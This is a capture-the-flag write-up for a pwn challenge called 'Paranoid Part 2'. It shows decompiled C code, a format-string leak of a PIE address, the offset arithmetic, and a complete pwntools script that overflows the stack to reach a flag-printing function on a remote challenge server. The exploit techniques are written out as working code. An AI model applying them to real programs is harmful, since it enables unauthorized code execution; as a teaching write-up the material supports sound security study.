+++
title = "Paranoid Part 2"
date = 2024-07-02
authors = ["Abhinav I S"]
+++

first, we will run checksec on the binary

```bash
checksec --file=challenge
```
<br>
{{ img(id="image1.png", alt="Alt Text", class="textCenter") }}

Opening the binary in a decompiler (Ghidra) and looking at main function gives 

```c

void main(void)

{
  undefined local_68 [48];
  char local_38 [48];
  
  banner();
  puts(
      "\nHey its Anonymous again...Someone leaked my temporary location to the FBI and they sent an  agent to the location I provided them"
      );
  puts("\nIt\'s no longer safe to provide you the address of our temporary meeting point.");
  puts("\nI\'m gonna have to hide and lay low for a while...");
  puts("\nTry reaching out to me after things have settled down");
  printf("\nGive me a name so that I can identify you if and when you contact me: ");
  fflush(stdout);
  read(0,local_38,0x23);
  printf("\nAlright Mr. ");
  printf(local_38);
  printf(
        "\nI\'ll look forward to doing business with you...Till then, is there anything that you would like to convey? "
        );
  fflush(stdout);
  read(0,local_68,0x110);
  return;
}
```
Analyzing other functions,
there seems to be a suspicious function safe_house

```c

void safe_house(void)

{
  char local_98 [136];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts(
        "\nThere is no \'flag.txt\' present in this directory. Please create sample flag for local e xploitation."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_98,0x80,local_10);
  printf(local_98);
  putchar(10);
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

clearly, we have to return to this function

there is a printf and two read function calls.
We can exploit a format string vulnereability to leak addresses from the stack, and calculate address of safe_house, since PIE is enabled

first step is to figure out the offset for the printf format string to print out addresses  in the code section

starting the binary in gdb, and disassembling main, we find that addresses likely in the text section start with 0x5555555

<br>
{{ img(id="image2.png", alt="Alt Text", class="textCenter") }}

setting a break point at the first printf, and printing the stack

<br>
{{ img(id="image3.png", alt="Alt Text", class="textCenter") }}

we can see that %21$lx prints out the address of main

Next, we need to calculate the address of safe_house
from ghidra, we can see that the address of safe_house is 0x010125a,
and address of main is 0x0101316

So, address of win is main - 188

We can create our solve script, overflowing the buffer, RBP, into the return address

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge")

context.binary = exe
# context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rvcechalls.xyz", 27250)

    return r


def main():
    r = conn()
    r.recv()
    r.sendline(b"%21$lx")
    data = r.recv()
    lines = data.split(b"\n")
    main = lines[1].split(b".")[1].lstrip(b" ")
    print(main)
    win = int(main,16) - 188
    print(hex(win))
    payload = b"A"*0x68 + p64(win+1)
    r.sendline(payload)
    print(r.recv())
    r.interactive()




if __name__ == "__main__":
    main()
```

giving the flag

```
flag{Mr_S0-c4ll3d_4n0nym0u5_ha5_l04d5ss_0F_53cUr1Ty_155u35_1907e55351f}
```

